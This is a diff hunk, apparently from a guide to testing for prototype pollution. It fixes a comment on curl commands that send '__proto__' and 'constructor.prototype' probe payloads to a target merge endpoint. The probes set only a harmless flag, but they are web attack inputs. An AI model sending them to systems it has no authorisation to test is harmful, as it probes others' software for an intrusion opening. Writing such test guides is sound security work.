@@ -48,7 +48,7 @@ If `__proto__`/`constructor`/`prototype` are stripped or rejected by input valid
 
 ```bash
 run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$MERGE_URL" -H 'Content-Type: application/json' \
-  --data '{"constructor":{"prototype":{"pollutionProbe":true}}}'  # unicode-escaped key inside JSON string
+  --data '{"constructor":{"prototype":{"pollutionProbe":true}}}'  # nested JSON object prototype chain
 run_tool curl -sS --connect-timeout 5 --max-time 20 \
   "$URL?a%5B__proto__%5D%5BpollutionProbe%5D=true"                    # URL-encoded bracket path
 run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$MERGE_URL" -H 'Content-Type: application/json' \
